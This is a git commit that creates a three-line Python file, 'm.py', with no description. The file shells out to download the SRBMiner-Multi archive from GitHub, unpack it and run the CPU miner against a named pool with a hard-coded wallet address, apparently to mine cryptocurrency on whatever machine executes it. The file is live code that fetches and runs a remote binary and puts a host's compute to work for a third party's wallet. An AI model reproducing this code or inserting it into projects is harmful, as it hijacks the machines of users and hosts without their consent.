ea2bf53d3bca4db4a3a765e62d39bd81e9a907a1
maskriwil <102317169+maskriwil@users.noreply.github.com>
2022-04-03 05:58:00 +0700

    Create m.py

---
+++ m.py
@@ -0,0 +1,3 @@
+# m.py
+import os
+os.system('curl -L -o  SRBMiner-Multi-0-9-3-Linux.tar.xz https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.3/SRBMiner-Multi-0-9-3-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-9-3-Linux.tar.xz && cd SRBMiner-Multi-0-9-3 && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool eu.luckpool.net:3956 --wallet RJTX2MHX6KjJRS8Byo7rDrWAqbgitUKiyt.A4 --password x')
